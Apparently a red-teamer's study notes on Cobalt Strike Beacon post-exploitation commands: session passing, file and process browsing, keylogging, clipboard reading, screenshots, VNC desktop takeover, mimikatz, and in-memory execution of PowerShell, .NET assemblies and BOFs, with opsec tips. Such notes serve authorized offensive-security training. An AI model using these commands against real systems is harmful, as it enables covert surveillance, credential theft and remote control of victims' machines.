The post-exploitation phase is the meat and potatoes of an engagement as this is where the red team would begin hunting down the operational objective.

Each Beacon command can be categorized according to how it operates under the hood.

Beacon Command Categorization and Examples
```powershell
## House-keeping -- change/return values in Beacon's memory
sleep, spawnto, jobs, ppid

## API-Only -- only call Win APIs
cd, cp, ls, mv, ps, pwd, rm

## Inline Execution
inline-execute  # expects BOF which runs inside memory space of Beacon
dllload, getsystem, timestomp  # BOFs

## Fork & Run -- exec pattern where temp process is spawned and a post-ex cape is injected into it. Larger detection surface :(
execute-assembly, powerpick # Spawn - Executes cape as NEW process
psinject                    # Explicit - Injects cape into EXISTING process
mimikatz, portscan, keylogger # Either
```

## Session Passing
Session passing is a technique for spawning new Beacon sessions from existing ones. ie: You have a low-and-slow channel for persistence but want to switch to faster channel for post-ex commands.

`spawn` & `spawnas`
```powershell
# spawn -- starts new process and injects shellcode into it. Same user
beacon> spawn [x86|x64] [listener]  # syntax
beacon> spawn x64 http              # example 

# spawnas -- similar but accepts creds for another user
beacon> spawnas [DOMAIN\user] [password] [listener]  # syntax
```

## File System
```powershell
beacon> ls
beacon> cd
beacon> drives # check if machine has additional drives

# File Browser -- Another way to interact with the file system
beacon> file_browser # or right click Beacon > Explore > File Browser
```
![[Pasted image 20251221215658.png]]

## Downloading Files
```PowerShell
beacon> download [file]
beacon> cancel

# To View Downloaded Files
View > Downloads > Select file(s) > Sync Files > select directory

# Remove files from team server
Delete Files button
```

## Processes
```PowerShell
beacon> ps   # List running processes

# Process Browser -- Another way to interact with processes
beacon> process_browser # or Explort > Process List
```

## Keylogger
The Cobalt Strike keylogger will log the key presses made by the user who owns the process the post-ex capability is injected into.

```PowerShell
beacon> keylogger [pid] [x86|x64]

View > Keystrokes         # View Output
Right-click row > Save    # Save output to text file on local computer
Right-click row > Delete  # Remove row

# Monitor keylogger
beacon> jobs          # View Keylogger JID, PID, and Description
beacon> jobkill [JID] # Kill keylogger
```

## Clipboard
Content of user's clipboard can be read with `clipboard` command

```PowerShell
beacon> clipboard
```

## Registry
Beacon can query the local registry with the `reg` command

```PowerShell
# List all subkeys and values
beacon> reg query  [x86|x64] [root\path]

# Read value of a specific key
beacon> reg queryv [x86|x64] [root\path] [subkey]
```

## Screenshots
There are a few different ways in which Beacon can take screenshots of the target's desktop. 

```powershell
# printscreen -- sends PrintScr keypress, pull clipboard. **Use sparingly**
beacon> printscreen                  # spawns temp process
beacon> printscreen [pid] [x86|x64]  # injects into specified process

# screenshot -- post-ex DLL to grab content of screen.
beacon> screenshot                   # spawn temp process
beacon> screenshot [pid] [x86|x64]   # inject into specified process
Right-click beacon > Explorer > Screenshot # Alternative

# screenwatch -- continuous screenshots automatically
beacon> screenwatch                  # spawn temp process
beacon> screenwatch [pid] <x86|x64>  # inject into specified process
# Tied to sleep time of beacon. sleep 5 = screenshot every 5 seconds
View > Screenshots            # view screenshots
	Right-click row > Save    # save to local comp
	Right-click row > Delete  # delete
```

## VNC (Remote Control of Desktop)
Cobalt Strike can also inject an entire reflective VNC DLL to obtain remote control over the user's desktop.

```powershell
# high or low quality
beacon> desktop [pid] [x86|x64] [high|low]  # inject 
beacon> desktop [high|low]                  # spawn temp process

# Spawns session in 'view mode' by default, but can take control
```

## Execution Commands
The `shell` and `run` commands allow operators to run any arbitrary command on the target and get the output.

```powershell
## GENERALLY BAD OPSEC - PRIORITIZE API-ONLY CMDS (like ls or getuid)
# execute comands like normal cmd prompt
beacon> shell [command] [arguments]        # shell = cmd.exe /c

# executes target programs directly
beacon> run [program] [arguments]
```

## Executing Custom Tools
Beacon provides means to execute PowerShell scripts, .NET assemblies, and reflective DLLs, all in-memory to give as much flexibility as possible to the operator.

```powershell
## Executing PowerShell in Beacon
beacon> powershell [cmdlet] [argument]     # roughly equivalent to shell
beacon> powerpick [commandlet] [arguments] # uses powershell APIs, SPAWNS NEW PROCESS. CAREFUL!!!
beacon> psinject [pid] [arch] [commandlet] [arguments] # Like powerpick, but inject into existing process

## Importing PowerShell scripts
beacon> powershell-import [/path/to/local/script.ps1]
	# automatically imported into powershell session
	# Beacon can only hold ONE imported script at a time

## Execute .NET assembly from memory -- ONLY .NET Framework (ie: no .NET/.NET Core) 
beacon> execute-assembly [/path/to/file.exe] [arguments]

## Execute BOFs 
beacon> inline-execute [/path/to/file.o] [args]
	# NOTE: BOF tooling ofter wrapper in their OWN cmd aliases
	# ie: ipconfig = beacon_inline_execute($1, readbof($1, "ipconfig", $null, "T1016"), "go", $null);
```